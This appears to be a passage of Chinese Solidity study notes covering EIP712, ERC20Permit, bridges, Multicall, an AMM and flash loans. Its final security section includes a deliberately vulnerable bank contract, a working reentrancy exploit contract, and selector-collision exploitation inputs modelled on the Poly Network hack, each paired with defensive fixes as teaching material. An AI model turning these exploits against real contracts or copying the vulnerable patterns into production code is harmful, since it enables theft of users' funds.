            return supply == 0 ? shares : shares * totalAssets() / supply; // 如果 supply 为 0，那么 1:1 赎回基础资产，如果 supply 不为0，那么按比例赎回
        }

        function previewDeposit(uint256 assets) public view virtual returns (uint256) { return convertToShares(assets); } // 预计算存款能获得的份额
        function previewMint(uint256 shares) public view virtual returns (uint256) { return convertToAssets(shares); } // 由份额推算所需资金
        function previewWithdraw(uint256 assets) public view virtual returns (uint256) { return convertToShares(assets); } // 资金推算份额
        function previewRedeem(uint256 shares) public view virtual returns (uint256) { return convertToAssets(shares); } // 份额推算资金

        function maxDeposit(address) public view virtual returns (uint256) { return type(uint256).max; }
        function maxMint(address) public view virtual returns (uint256) { return type(uint256).max; }
        function maxWithdraw(address owner) public view virtual returns (uint256) { return convertToAssets(balanceOf(owner)); } // 持有份额对应的最大资产
        function maxRedeem(address owner) public view virtual returns (uint256) { return balanceOf(owner); }
    }
    ```

### 2024.10.10
- [103-52] [EIP712](https://eips.ethereum.org/EIPS/eip-712) 类型化数据签名: 更先进、安全的签名方法，EIP712 类型化数据签名
    - 之前的 ECDSA 签名是 EIP191 签名标准（personal sign），可以给一段消息签名。但是它过于简单，当签名数据比较复杂时，用户只能看到一串十六进制字符串（数据的哈希），无法核实签名内容是否与预期相符。当支持 EIP712 的 Dapp 请求签名时，钱包会展示签名消息的原始数据，用户可以在验证数据符合预期之后签名。EIP712 的应用一般包含链下签名（前端或脚本）和链上验证（合约）两部分。
    - 链下签名：
        - EIP712 签名必须包含一个 EIP712Domain 部分，它包含了合约的 name，version（一般约定为 “1”），chainId，和 verifyingContract（验证签名的合约地址）。这些信息会在用户签名时显示，并确保只有特定链的特定合约才能验证签名。你需要在脚本中传入相应参数。
        ```js
        const domain = {
            name: "EIP712Storage",
            version: "1",
            chainId: "1",
            verifyingContract: "0xf8e81D47203A594245E36C48e151709F0C19fBe8",
        };
        ```
        - 根据使用场景自定义一个签名的数据类型，他要与合约匹配。
        - 调用钱包对象的 signTypedData() 方法，传入前面步骤中的 domain，types，和 message 变量进行签名（
        ```js
        const domain = {
            name: name,
            version: version,
            chainId: chainId,
            verifyingContract: contractAddress,
        };

        const types = { // 自定义类型
            Storage: [
            { name: "spender", type: "address" },
            { name: "number", type: "uint256" },
            ],
        };

        const message = { // 自定义类型的数据
            spender: spender,
            number: number,
        };

        try {
            console.log(message)
            const signature = await signer.signTypedData(domain, types, message);
            console.log("Signature:", signature);
            showSignature.innerHTML = `${signature}`;
        } catch (error) {
            console.error("Error signing permit:", error);
        }
        ```
    - 链上验证：验证签名，如果通过，则修改；
    ```solidity
    contract EIP712Storage {
        using ECDSA for bytes32;
        // EIP712Domain 的类型哈希
        bytes32 private constant EIP712DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
        // Storage 的类型哈希
        bytes32 private constant STORAGE_TYPEHASH = keccak256("Storage(address spender,uint256 number)");
        bytes32 private DOMAIN_SEPARATOR; // 由 EIP712DOMAIN_TYPEHASH 以及 EIP712Domain （name, version, chainId, verifyingContract）组成, 每个 DApp 尽可能唯一
        uint256 number;
        address owner;

        constructor(){
            DOMAIN_SEPARATOR = keccak256(abi.encode(
                EIP712DOMAIN_TYPEHASH, // type hash
                keccak256(bytes("EIP712Storage")), // name
                keccak256(bytes("1")), // version
                block.chainid, // chain id
                address(this) // contract address
            ));
            owner = msg.sender;
        }
        function permitStore(uint256 _num, bytes memory _signature) public {
            // 检查签名长度，65是标准r,s,v签名的长度
            require(_signature.length == 65, "invalid signature length");
            bytes32 r;
            bytes32 s;
            uint8 v;
            assembly {
                /*
                    前32 bytes存储签名的长度 (动态数组存储规则)
                    add(sig, 32) = sig的指针 + 32
                    等效为略过signature的前32 bytes
                    mload(p) 载入从内存地址p起始的接下来32 bytes数据
                */
                // 读取长度数据后的32 bytes
                r := mload(add(_signature, 0x20))
                // 读取之后的32 bytes
                s := mload(add(_signature, 0x40))
                // 读取最后一个byte
                v := byte(0, mload(add(_signature, 0x60)))
            }

            // 获取签名消息hash
            bytes32 digest = keccak256(abi.encodePacked(
                "\x19\x01",
                DOMAIN_SEPARATOR,
                keccak256(abi.encode(STORAGE_TYPEHASH, msg.sender, _num))
            )); 
            
            address signer = digest.recover(v, r, s);                     // 恢复签名者
            require(signer == owner, "EIP712Storage: Invalid signature"); // 检查签名

            // 修改状态变量
            number = _num;
        }
        function retrieve() public view returns (uint256){
            return number;
        }    
    ```
- [103-53] ERC-2612 ERC20Permit
    - ERC20的 approve 函数限制了只有代币所有者才能调用，这意味着所有 ERC20 代币的初始操作必须由 EOA 执行。举个例子，用户 A 在去中心化交易所使用 USDT 交换 ETH，必须完成两个交易：第一步用户 A 调用 approve 将 USDT 授权给合约，第二步用户 A 调用合约进行交换。非常麻烦，并且用户必须持有 ETH 用于支付交易的 gas。
    - EIP-2612 提出了 ERC20Permit，扩展了 ERC20 标准，添加了一个 permit 函数，允许用户通过 EIP-712 签名修改授权，而不是通过 msg.sender。这有两点好处：
        - 授权这步仅需用户在链下签名，减少一笔交易。
        - 签名后，用户可以委托第三方进行后续交易，不需要持有 ETH：用户 A 可以将签名发送给 拥有gas的第三方 B，委托 B 来执行后续交易。
    - IERC20Permit 接口合约
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    // ERC20 Permit 扩展的接口，允许通过签名进行批准，如 https://eips.ethereum.org/EIPS/eip-2612[EIP-2612]中定义。
    interface IERC20Permit {
        /**
        * @dev 根据owner的签名, 将 `owenr` 的ERC20余额授权给 `spender`，数量为 `value`, 释放 {Approval} 事件。
        * 要求：
        * - `spender` 不能是零地址。
        * - `deadline` 必须是未来的时间戳。
        * - `v`，`r` 和 `s` 必须是 `owner` 对 EIP712 格式的函数参数的有效 `secp256k1` 签名。
        * - 签名必须使用 `owner` 当前的 nonce（参见 {nonces}）。
        */
        function permit(address owner,address spender,uint256 value,uint256 deadline,uint8 v,bytes32 r,bytes32 s) external;

        /**
        * @dev 返回 `owner` 的当前 nonce。每次为 {permit} 生成签名时，都必须包括此值。
        * 每次成功调用 {permit} 都会将 `owner` 的 nonce 增加 1。这防止多次使用签名。
        */
        function nonces(address owner) external view returns (uint256);

        /**
        * @dev 返回用于编码 {permit} 的签名的域分隔符（domain separator），如 {EIP712} 所定义。
        */
        // solhint-disable-next-line func-name-mixedcase
        function DOMAIN_SEPARATOR() external view returns (bytes32);
    }
    ```
    - 前段计算 permit 签名
    ```js
    async function signPermit() {
      // 略。

      const domain = {
        name: name,
        version: version,
        chainId: chainId,
        verifyingContract: contractAddress,
      };

      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      };

      const message = {
        owner: owner,
        spender: spender,
        value: value,
        nonce: nonce,
        deadline: deadline,
      };

      try {
        console.log(message)
        const signature = await signer.signTypedData(domain, types, message);
        const sig = ethers.Signature.from(signature);
        console.log("Signature:", signature);
        SignatureV.innerHTML = `${sig.v}`;
        SignatureR.innerHTML = `${sig.r}`;
        SignatureS.innerHTML = `${sig.s}`;
        showSignature.innerHTML = `${signature}`;
      } catch (error) {
        console.error("Error signing permit:", error);
      }
    }
    ```
    - ERC20Permit 合约
    ```solidity
    contract ERC20Permit is ERC20, IERC20Permit, EIP712 {
        mapping(address => uint) private _nonces; // Permit 单独维护一套 nonce
        bytes32 private constant _PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

        constructor(string memory name, string memory symbol) EIP712(name, "1") ERC20(name, symbol){}

        function permit(address owner,address spender,uint256 value,uint256 deadline,uint8 v,bytes32 r,bytes32 s) public virtual override {
            require(block.timestamp <= deadline, "ERC20Permit: expired deadline");

            bytes32 structHash = keccak256(abi.encode(_PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));
            bytes32 hash = _hashTypedDataV4(structHash);
            
            address signer = ECDSA.recover(hash, v, r, s);
            require(signer == owner, "ERC20Permit: invalid signature");
            
            _approve(owner, spender, value);
        }

        function nonces(address owner) public view virtual override returns (uint256) {
            return _nonces[owner];
        }

        function DOMAIN_SEPARATOR() external view override returns (bytes32) {
            return _domainSeparatorV4();
        }

        function _useNonce(address owner) internal virtual returns (uint256 current) {
            current = _nonces[owner];
            _nonces[owner] += 1;
        }

        function mint(uint amount) external {
            _mint(msg.sender, amount);
        }
    }
    ```
- [103-54] 跨链桥
    - 跨链桥是一种区块链协议，它允许在两个或多个区块链之间移动数字资产和信息。跨链桥不是区块链原生支持的，跨链操作需要可信第三方来执行，这也带来了风险。跨链桥主要有以下三种类型：
        - Burn/Mint：在源链上销毁（burn）代币，然后在目标链上创建（mint）同等数量的代币。此方法好处是代币的总供应量保持不变，但是需要跨链桥拥有代币的铸造权限，适合项目方搭建自己的跨链桥。
        - Stake/Mint：在源链上锁定（stake）代币，然后在目标链上创建（mint）同等数量的代币（凭证）。源链上的代币被锁定，当代币从目标链移回源链时再解锁。这是一般跨链桥使用的方案，不需要任何权限，但是风险也较大，当源链的资产被黑客攻击时，目标链上的凭证将变为空气。
        - Stake/Unstake：在源链上锁定（stake）代币，然后在目标链上释放（unstake）同等数量的代币，在目标链上的代币可以随时兑换回源链的代币。这个方法需要跨链桥在两条链都有锁定的代币，门槛较高，一般需要激励用户在跨链桥锁仓。
    - 这里举例一个简单的跨链桥（没有考虑生产环境中的一些问题，比如交易失败、链的重组等等，不要直接用于生产环境）。
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.20;

    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    import "@openzeppelin/contracts/access/Ownable.sol";

    contract CrossChainToken is ERC20, Ownable {
        event Bridge(address indexed user, uint256 amount);
        event Mint(address indexed to, uint256 amount);

        constructor(
            string memory name,
            string memory symbol,
            uint256 totalSupply
        ) payable ERC20(name, symbol) Ownable(msg.sender) {
            _mint(msg.sender, totalSupply);
        }

        function bridge(uint256 amount) public {
            _burn(msg.sender, amount);
            emit Bridge(msg.sender, amount);
        }
        
        function mint(address to, uint amount) external onlyOwner {
            _mint(to, amount);
            emit  Mint(to, amount);
        }
    }
    ```
    这个合约还需要一个服务来监听链上事件。当事件被触发时，在目标链上创建同样数量的代币。
    ```solidity
    import { ethers } from "ethers";

    // 初始化两条链的provider
    const providerGoerli = new ethers.JsonRpcProvider("Goerli_Provider_URL");
    const providerSepolia = new ethers.JsonRpcProvider("Sepolia_Provider_URL");

    // 初始化两条链的signer, privateKey填管理者钱包的私钥
    const privateKey = "Your_Key";
    const walletGoerli = new ethers.Wallet(privateKey, providerGoerli);
    const walletSepolia = new ethers.Wallet(privateKey, providerSepolia);

    // 合约地址和ABI
    const contractAddressGoerli = "0xa2950F56e2Ca63bCdbA422c8d8EF9fC19bcF20DD";
    const contractAddressSepolia = "0xad20993E1709ed13790b321bbeb0752E50b8Ce69";

    const abi = [
        "event Bridge(address indexed user, uint256 amount)",
        "function bridge(uint256 amount) public",
        "function mint(address to, uint amount) external",
    ];

    // 初始化合约实例
    const contractGoerli = new ethers.Contract(contractAddressGoerli, abi, walletGoerli);
    const contractSepolia = new ethers.Contract(contractAddressSepolia, abi, walletSepolia);

    const main = async () => {
        try{
            console.log(`开始监听跨链事件`)

            // 监听chain Sepolia的Bridge事件，然后在Goerli上执行mint操作，完成跨链
            contractSepolia.on("Bridge", async (user, amount) => {
                console.log(`Bridge event on Chain Sepolia: User ${user} burned ${amount} tokens`);

                // 在执行burn操作
                let tx = await contractGoerli.mint(user, amount);
                await tx.wait();

                console.log(`Minted ${amount} tokens to ${user} on Chain Goerli`);
            });

            // 监听chain Goerli的Bridge事件，然后在Sepolia上执行mint操作，完成跨链
            contractGoerli.on("Bridge", async (user, amount) => {
                console.log(`Bridge event on Chain Goerli: User ${user} burned ${amount} tokens`);

                // 在执行burn操作
                let tx = await contractSepolia.mint(user, amount);
                await tx.wait();

                console.log(`Minted ${amount} tokens to ${user} on Chain Sepolia`);
            });
        } catch(e) {
            console.log(e);
        } 
    }

    main();
    ```
### 2024.10.11

- [103-55] 多重调用
    - MultiCall 多重调用合约，它的设计目的在于一次交易中执行多个函数调用，这样可以显著降低交易费用并提高效率。由 [Multicall3](https://github.com/mds1/multicall/blob/main/src/Multicall3.sol) 简化而来。
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.19;

    contract Multicall {
        struct Call {
            address target;     // 目标合约
            bool allowFailure;  // 是否允许调用失败allowFailure
            bytes callData;     // 调用参数
        }

        struct Result {
            bool success;
            bytes returnData;
        }

        /// @notice 将多个调用（支持不同合约/不同方法/不同参数）合并到一次调用
        function multicall(Call[] calldata calls) public returns (Result[] memory returnData) {
            uint256 length = calls.length;
            returnData = new Result[](length);
            Call calldata calli;
            
            // 在循环中依次调用
            for (uint256 i = 0; i < length; i++) {
                Result memory result = returnData[i];
                calli = calls[i];
                (result.success, result.returnData) = calli.target.call(calli.callData);
                // 如果 calli.allowFailure 和 result.success 均为 false，则 revert
                if (!(calli.allowFailure || result.success)){
                    revert("Multicall: call failed");
                }
            }
        }
    }
    ```
- [103-56] 去中心化交易所
    - 恒定乘积自动做市商（Constant Product Automated Market Maker, CPAMM）是去中心化交易所的核心机制，被 Uniswap，PancakeSwap 等一系列 DEX 采用。教学代码由 [uniswap v2](https://github.com/Uniswap/v2-core) 简化而成，包括了CPAMM最核心的功能。
    - 自动做市商（Automated Market Maker，简称 AMM）是一种在区块链上运行的智能合约（算法），允许数字资产之间的去中心化交易。AMM 的引入开创了一种全新的交易方式，无需传统的买家和卖家进行订单匹配，而是通过一种预设的数学公式（比如，常数乘积公式）创建一个流动性池，使得用户可以随时进行交易。
        - 恒定总和自动做市商（Constant Sum Automated Market Maker, CSAMM）： 约束 $k=x+y$ swap 前后交易对总数不变；缺点：有限流动性；
        - 恒定乘积自动做市商（CPAMM）：约束 $k=x*y$  “无限”流动性：代币的相对价格会随着买卖而变化，越稀缺的代币相对价格会越高，避免流动性被耗尽。
    - DEX 主要有两类参与者：流动性提供者（Liquidity Provider，LP）和交易者（Trader）。流动性提供者给市场提供流动性，让交易者获得更好的报价和流动性，并收取一定费用。当用户向代币池添加流动性时，合约要记录添加的LP份额。根据 Uniswap V2，LP份额如下计算：
        - 首次添加：$\Delta{L}=\sqrt{\Delta{x}*\Delta{y}}$。
        - 非首次添加：$\Delta{L}=L*\min(\frac{\Delta{x}}{x},\frac{\Delta{y}}{y})$
        - 移除流动性：$\Delta{x}=\frac{\Delta{L}}{L}*x, \Delta{y}=\frac{\Delta{L}}{L}y$
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.19;
    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

    contract SimpleSwap is ERC20 {
        // 代币合约
        IERC20 public token0;
        IERC20 public token1;

        // 代币储备量
        uint public reserve0;
        uint public reserve1;

        // 事件 
        event Mint(address indexed sender, uint amount0, uint amount1);
        event Burn(address indexed sender, uint amount0, uint amount1);
        event Swap(address indexed sender,uint amountIn,address tokenIn,uint amountOut,address tokenOut);

        // 构造器，初始化代币地址
        constructor(IERC20 _token0, IERC20 _token1) ERC20("SimpleSwap", "SS") {
            token0 = _token0;
            token1 = _token1;
        }

        function min(uint x, uint y) internal pure returns (uint z) {
            z = x < y ? x : y;
        }

        // 计算平方根 babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)
        function sqrt(uint y) internal pure returns (uint z) {
            if (y > 3) {
                z = y;
                uint x = y / 2 + 1;
                while (x < z) {
                    z = x;
                    x = (y / x + x) / 2;
                }
            } else if (y != 0) {
                z = 1;
            }
        }

        function addLiquidity(uint amount0Desired, uint amount1Desired) public returns(uint liquidity){
            token0.transferFrom(msg.sender, address(this), amount0Desired);
            token1.transferFrom(msg.sender, address(this), amount1Desired);
            uint _totalSupply = totalSupply();
            if (_totalSupply == 0) {
                // 如果是第一次添加流动性，铸造 L = sqrt(x * y) 单位的LP（流动性提供者）代币
                liquidity = sqrt(amount0Desired * amount1Desired);
            } else {
                // 如果不是第一次添加流动性，按添加代币的数量比例铸造LP，取两个代币更小的那个比例
                liquidity = min(amount0Desired * _totalSupply / reserve0, amount1Desired * _totalSupply /reserve1);
            }

            require(liquidity > 0, 'INSUFFICIENT_LIQUIDITY_MINTED');

            reserve0 = token0.balanceOf(address(this));
            reserve1 = token1.balanceOf(address(this));

            _mint(msg.sender, liquidity);            
            emit Mint(msg.sender, amount0Desired, amount1Desired);
        }

        function removeLiquidity(uint liquidity) external returns (uint amount0, uint amount1) {
            uint balance0 = token0.balanceOf(address(this));
            uint balance1 = token1.balanceOf(address(this));
            uint _totalSupply = totalSupply();
            amount0 = liquidity * balance0 / _totalSupply;
            amount1 = liquidity * balance1 / _totalSupply;
            require(amount0 > 0 && amount1 > 0, 'INSUFFICIENT_LIQUIDITY_BURNED');
            _burn(msg.sender, liquidity);
            token0.transfer(msg.sender, amount0);
            token1.transfer(msg.sender, amount1);
            reserve0 = token0.balanceOf(address(this));
            reserve1 = token1.balanceOf(address(this));
            emit Burn(msg.sender, amount0, amount1);
        }

        // 给定一个资产的数量和代币对的储备，计算交换另一个代币的数量，由于乘积恒定
        // 交换前: k = x * y
        // 交换后: k = (x + delta_x) * (y + delta_y)
        // 可得 delta_y = - delta_x * y / (x + delta_x)
        // 正/负号代表转入/转出
        function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) public pure returns (uint amountOut) {
            require(amountIn > 0, 'INSUFFICIENT_AMOUNT');
            require(reserveIn > 0 && reserveOut > 0, 'INSUFFICIENT_LIQUIDITY');
            amountOut = amountIn * reserveOut / (reserveIn + amountIn);
        }

        function swap(uint amountIn, IERC20 tokenIn, uint amountOutMin) external returns (uint amountOut, IERC20 tokenOut){
            require(amountIn > 0, 'INSUFFICIENT_OUTPUT_AMOUNT');
            require(tokenIn == token0 || tokenIn == token1, 'INVALID_TOKEN');
            
            uint balance0 = token0.balanceOf(address(this));
            uint balance1 = token1.balanceOf(address(this));

            if(tokenIn == token0){
                tokenOut = token1;
                amountOut = getAmountOut(amountIn, balance0, balance1);
                require(amountOut > amountOutMin, 'INSUFFICIENT_OUTPUT_AMOUNT');
                tokenIn.transferFrom(msg.sender, address(this), amountIn);
                tokenOut.transfer(msg.sender, amountOut);
            }else{
                tokenOut = token0;
                amountOut = getAmountOut(amountIn, balance1, balance0);
                require(amountOut > amountOutMin, 'INSUFFICIENT_OUTPUT_AMOUNT');
                tokenIn.transferFrom(msg.sender, address(this), amountIn);
                tokenOut.transfer(msg.sender, amountOut);
            }

            reserve0 = token0.balanceOf(address(this));
            reserve1 = token1.balanceOf(address(this));

            emit Swap(msg.sender, amountIn, address(tokenIn), amountOut, address(tokenOut));
        }
    }
    ```
    - 进阶阅读：
        - [Programming DeFi: Uniswap V2](https://jeiwan.net/posts/programming-defi-uniswapv2-1/)
        - [Uniswap v3 book](https://y1cunhui.github.io/uniswapV3-book-zh-cn/)
- [103-57] 闪电贷
    - 闪电贷（Flashloan）是DeFi的一种创新，它允许用户在一个交易中借出并迅速归还资金，而无需提供任何抵押。在Web3，你可以在DeFI平台（Uniswap，AAVE，Dodo）中进行闪电贷获取资金，就可以在无担保的情况下借100万u的代币，执行链上套利，最后再归还贷款和利息。
    - [Uniswap V2 Pair](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L159) 合约的 `swap()` 函数支持闪电贷。Uniswap V2闪电贷的利息为每笔0.3%。
        ```solidity
        function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {
            // 其他逻辑...

            // 乐观的发送代币到to地址
            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out);
            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out);

            // 调用to地址的回调函数uniswapV2Call
            if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data); // 执行闪电贷逻辑

            // 其他逻辑...

            // 通过k=x*y公式，检查闪电贷是否归还成功
            require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');
        }
        ```
        ```solidity
        // SPDX-License-Identifier: MIT
        pragma solidity ^0.8.20;

        import "./Lib.sol";

        // UniswapV2闪电贷回调接口
        interface IUniswapV2Callee {
            function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
        }

        // UniswapV2闪电贷合约
        contract UniswapV2Flashloan is IUniswapV2Callee {
            address private constant UNISWAP_V2_FACTORY =
                0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

            address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
            address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

            IUniswapV2Factory private constant factory = IUniswapV2Factory(UNISWAP_V2_FACTORY);

            IERC20 private constant weth = IERC20(WETH);

            IUniswapV2Pair private immutable pair;

            constructor() {
                pair = IUniswapV2Pair(factory.getPair(DAI, WETH));
            }

            // 闪电贷函数
            function flashloan(uint wethAmount) external {
                // calldata长度大于1才能触发闪电贷回调函数
                bytes memory data = abi.encode(WETH, wethAmount);

                // amount0Out是要借的DAI, amount1Out是要借的WETH
                pair.swap(0, wethAmount, address(this), data);
            }

            // 闪电贷回调函数，只能被 DAI/WETH pair 合约调用
            function uniswapV2Call(
                address sender,
                uint amount0,
                uint amount1,
                bytes calldata data
            ) external {
                // 确认调用的是 DAI/WETH pair 合约
                address token0 = IUniswapV2Pair(msg.sender).token0(); // 获取token0地址
                address token1 = IUniswapV2Pair(msg.sender).token1(); // 获取token1地址
                assert(msg.sender == factory.getPair(token0, token1)); // ensure that msg.sender is a V2 pair

                // 解码calldata
                (address tokenBorrow, uint256 wethAmount) = abi.decode(data, (address, uint256));

                // flashloan 逻辑，这里省略
                require(tokenBorrow == WETH, "token borrow != WETH");

                // 计算flashloan费用
                // fee / (amount + fee) = 3/1000
                // 向上取整
                uint fee = (amount1 * 3) / 997 + 1;
                uint amountToRepay = amount1 + fee;

                // 归还闪电贷
                weth.transfer(address(pair), amountToRepay);
            }
        }
        ```
        - Forge Test [code](https://github.com/AmazingAng/WTF-Solidity/blob/main/57_Flashloan/test/UniswapV2Flashloan.t.sol)
        -  注意：回调函数一定要做好权限控制，确保只有Uniswap的Pair合约可以调用。
    - Uniswap V3：Uniswap V3在Pool池合约中加入了[flash()](https://github.com/Uniswap/v3-core/blob/main/contracts/UniswapV3Pool.sol#L791C1-L835C1)函数直接支持闪电贷，（Uniswap V3每笔闪电贷的手续费与交易手续费一致）核心代码如下：
    ```solidity
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override lock noDelegateCall {
        // 其他逻辑...

        // 乐观的发送代币到to地址
        if (amount0 > 0) TransferHelper.safeTransfer(token0, recipient, amount0);
        if (amount1 > 0) TransferHelper.safeTransfer(token1, recipient, amount1);

        // 调用to地址的回调函数uniswapV3FlashCallback
        IUniswapV3FlashCallback(msg.sender).uniswapV3FlashCallback(fee0, fee1, data);

        // 检查闪电贷是否归还成功
        uint256 balance0After = balance0();
        uint256 balance1After = balance1();
        require(balance0Before.add(fee0) <= balance0After, 'F0');
        require(balance1Before.add(fee1) <= balance1After, 'F1');

        // sub is safe because we know balanceAfter is gt balanceBefore by at least fee
        uint256 paid0 = balance0After - balance0Before;
        uint256 paid1 = balance1After - balance1Before;

        // 其他逻辑...
    }
    ```
    ```solidity
    // UniswapV3闪电贷合约
    contract UniswapV3Flashloan is IUniswapV3FlashCallback {
        address private constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

        address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        uint24 private constant poolFee = 3000;

        IERC20 private constant weth = IERC20(WETH);
        IUniswapV3Pool private immutable pool;

        constructor() {
            pool = IUniswapV3Pool(getPool(DAI, WETH, poolFee));
        }

        function getPool(address _token0,address _token1,uint24 _fee) public pure returns (address) {
            PoolAddress.PoolKey memory poolKey = PoolAddress.getPoolKey(_token0, _token1, _fee);
            return PoolAddress.computeAddress(UNISWAP_V3_FACTORY, poolKey);
        }

        function flashloan(uint wethAmount) external {
            bytes memory data = abi.encode(WETH, wethAmount);
            IUniswapV3Pool(pool).flash(address(this), 0, wethAmount, data);
        }

        // 闪电贷回调函数，只能被 DAI/WETH pair 合约调用
        function uniswapV3FlashCallback(uint fee0,uint fee1,bytes calldata data) external {
            // 确认调用的是 DAI/WETH pair 合约
            require(msg.sender == address(pool), "not authorized");            
            (address tokenBorrow, uint256 wethAmount) = abi.decode(data, (address, uint256));

            // flashloan 逻辑，这里省略

            require(tokenBorrow == WETH, "token borrow != WETH");

            // 归还闪电贷
            weth.transfer(address(pool), wethAmount + fee1);
        }
    }
    ```
    - AAVE 也差不多。AAVE V3闪电贷的手续费默认为每笔0.05%，比Uniswap的要低。


### 2024.10.12

- [104-S01] 重入攻击
    - 攻击者通过合约漏洞（例如 fallback 函数）循环调用合约，将合约中资产转走或铸造大量代币。漏洞例子：
    ```solidity
    contract Bank {
        mapping (address => uint256) public balanceOf;
        function deposit() external payable {
            balanceOf[msg.sender] += msg.value;
        }
        function withdraw() external {
            uint256 balance = balanceOf[msg.sender];
            require(balance > 0, "Insufficient balance");

            (bool success, ) = msg.sender.call{value: balance}(""); // 漏洞代码
            require(success, "Failed to send Ether");
            balanceOf[msg.sender] = 0;
        }

        function getBalance() external view returns (uint256) {
            return address(this).balance;
        }
    }
    ```
    - EXP：
    ```solidity
    contract Attack {
        Bank public bank;
        constructor(Bank _bank) {
            bank = _bank;
        }

        receive() external payable {
            if (bank.getBalance() >= 1 ether) {
                bank.withdraw();
            }
        }

        function attack() external payable {
            require(msg.value == 1 ether, "Require 1 Ether to attack");
            bank.deposit{value: 1 ether}();
            bank.withdraw();
        }

        function getBalance() external view returns (uint256) {
            return address(this).balance;
        }
    }
    ```
    - 防范方案：Check-Effect-Interaction 设计原则(检查-影响-交互模式)：编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。将Bank合约withdraw()函数中的更新余额提前到转账ETH之前即可：
    ```solidity
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        balanceOf[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
    }
    ```
    - 重入锁:一种防止重入函数的修饰器（modifier），它包含一个默认为0的状态变量_status。被nonReentrant重入锁修饰的函数，在第一次调用时会检查_status是否为0，紧接着将_status的值改为1，调用结束后才会再改为0。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。
    ```solidity
    uint256 private _status;
    modifier nonReentrant() {
        require(_status == 0, "ReentrancyGuard: reentrant call");
        _status = 1;
        _;
        _status = 0;
    }

    function withdraw() external nonReentrant{
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");

        balanceOf[msg.sender] = 0;
    }
    ```
    - OpenZeppelin 也提倡遵循 PullPayment(拉取支付)模式以避免潜在的重入攻击。其原理是通过引入第三方(escrow)，将原先的“主动转账”分解为“转账者发起转账”加上“接受者主动拉取”。当想要发起一笔转账时，会通过_asyncTransfer(address dest, uint256 amount)将待转账金额存储到第三方合约中，从而避免因重入导致的自身资产损失。而当接受者想要接受转账时，需要主动调用withdrawPayments(address payable payee)进行资产的主动获取。
- [104-S02] 选择器碰撞 [case: poly network](https://rekt.news/zh/polynetwork-rekt/)
    - 当用户调用合约的函数时，calldata的前4字节就是目标函数的选择器。下面这俩网站可以查选择器对应的不同函数:
        - https://www.4byte.directory/
        - https://sig.eth.samczsun.com/
    - 或者使用 PowerClash: https://github.com/AmazingAng/power-clash 暴力破解【因为只有4字节】；
    - 漏洞例子：
    ```solidity
    contract SelectorClash {
    bool public solved; // 攻击是否成功
        function putCurEpochConPubKeyBytes(bytes memory _bytes) public { // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。
            require(msg.sender == address(this), "Not Owner");
            solved = true;
        }
        // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。
        function executeCrossChainTx(bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num) public returns(bool success){
            (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, "(bytes,bytes,uint64)"))), abi.encode(_bytes, _bytes1, _num)));
        }
    }
    ```
    - 目标是利用executeCrossChainTx()函数调用合约中的putCurEpochConPubKeyBytes()，目标函数的选择器为：0x41973cd9。观察到executeCrossChainTx()中是利用_method参数和"(bytes,bytes,uint64)"作为函数签名计算的选择器。因此，我们只需要选择恰当的_method，让这里算出的选择器等于0x41973cd9，通过选择器碰撞调用目标函数。Poly Network黑客事件中，黑客碰撞出的_method为 f1121318093，即f1121318093(bytes,bytes,uint64)的哈希前4位也是0x41973cd9，可以成功的调用函数。接下来我们要做的就是将f1121318093转换为bytes类型：0x6631313231333138303933，然后作为参数输入到executeCrossChainTx()中。executeCrossChainTx()函数另3个参数不重要，填 0x, 0x, 0 就可以。
- [104-S03] 中心化风险
    - 中心化风险是 DeFi 中最常见的漏洞。中心化风险指智能合约的所有权是中心化的，例如合约的owner由一个地址控制，它可以随意修改合约参数，甚至提取用户资金。中心化的项目存在单点风险，可以被恶意开发者（内鬼）或黑客利用，只需要获取具有控制权限地址的私钥之后，就可以通过rug-pull，无限铸币，或其他类型方法盗取资金。
